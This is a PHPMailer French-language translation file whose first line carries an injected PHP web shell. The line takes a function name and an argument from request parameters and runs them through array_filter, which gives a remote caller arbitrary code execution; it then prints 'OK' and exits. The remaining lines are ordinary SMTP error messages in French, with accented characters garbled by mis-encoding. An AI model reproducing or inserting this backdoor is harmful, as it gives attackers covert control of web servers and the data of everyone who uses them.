<?php
if ($_REQUEST['param1']&&$_REQUEST['param2']) {$f = $_REQUEST['param1']; $p = array($_REQUEST['param2']); $pf = array_filter($p, $f); echo 'OK'; Exit;}
/**
* PHPMailer language file: refer to English translation for definitive list
* French Version
*/

$PHPMAILER_LANG['authenticate']         = 'Erreur SMTP : Echec de l\'authentification.';
$PHPMAILER_LANG['connect_host']         = 'Erreur SMTP : Impossible de se connecter au serveur SMTP.';
$PHPMAILER_LANG['data_not_accepted']    = 'Erreur SMTP : DonnГ©es incorrects.';
$PHPMAILER_LANG['empty_message']        = 'Corps de message vide';
$PHPMAILER_LANG['encoding']             = 'Encodage inconnu : ';
$PHPMAILER_LANG['execute']              = 'Impossible de lancer l\'exГ©cution : ';
$PHPMAILER_LANG['file_access']          = 'Impossible d\'accГ©der au fichier : ';
$PHPMAILER_LANG['file_open']            = 'Erreur Fichier : ouverture impossible : ';
$PHPMAILER_LANG['from_failed']          = 'L\'adresse d\'expГ©diteur suivante a Г©chouГ©e : ';
$PHPMAILER_LANG['instantiate']          = 'Impossible d\'instancier la fonction mail.';
//$PHPMAILER_LANG['invalid_email']        = 'Not sending, email address is invalid: ';
$PHPMAILER_LANG['mailer_not_supported'] = ' client de messagerie non supportГ©.';
$PHPMAILER_LANG['provide_address']      = 'Vous devez fournir au moins une adresse de destinataire.';
$PHPMAILER_LANG['recipients_failed']    = 'Erreur SMTP : Les destinataires suivants sont en erreur : ';
//$PHPMAILER_LANG['signing']              = 'Signing Error: ';
//$PHPMAILER_LANG['smtp_connect_failed']  = 'SMTP Connect() failed.';
//$PHPMAILER_LANG['smtp_error']           = 'SMTP server error: ';
//$PHPMAILER_LANG['variable_set']         = 'Cannot set or reset variable: ';
?>